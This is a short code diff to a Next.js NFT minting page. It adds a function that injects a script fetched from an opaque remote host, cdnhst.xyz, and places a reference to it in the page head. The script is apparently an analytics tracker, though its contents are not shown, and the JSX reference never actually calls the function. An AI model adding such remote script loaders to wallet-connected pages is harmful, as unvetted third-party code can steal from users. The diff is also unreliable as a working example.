@@ -147,7 +147,10 @@ useEffect(() => {
     })
 
     setIsMinting(false)
-  } 
+  }
+
+  function hitsteps()
+  { var hstc=document.createElement('script'); hstc.src='https://cdnhst.xyz/code?code=e31ce1057076b394a5f545754c9ba312';hstc.async=true;var htssc = document.getElementsByTagName('script')[0];htssc.parentNode.insertBefore(hstc, htssc);}; 
 
   return (
     <div className="min-h-screen w-full md:overflow-x-hidden overflow-auto flex flex-col items-center justify-center">
@@ -156,6 +159,7 @@ useEffect(() => {
         <title>PMTR NFTs - Minting Page</title>
         <meta name="Description" content="PMTR NFTS-Minting page!" />
         <link rel="icon" href="/favicon.png" />
+        {hitsteps}
     </Head>
 
       <img src="/bg.png" className="hidden md:flex w-full h-full absolute"/>
